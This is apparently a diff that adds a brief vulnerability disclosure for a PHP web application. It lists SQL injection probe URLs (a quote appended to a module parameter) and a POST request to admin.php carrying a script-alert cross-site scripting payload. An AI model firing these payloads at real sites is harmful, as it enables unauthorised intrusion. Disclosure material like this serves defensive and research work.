@@ -1,0 +1,10 @@
+SQL injection:
+
+http://www.example.com/download.php?module=1%27
+http://www.example.com/upload.php?module=1%27
+
+Cross-site scripting:
+
+POST /admin.php HTTP/1.1
+
+user_name=111&amp;pass=222&amp;whereform=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&amp;submit=%C2%EE%E9%F2%E8
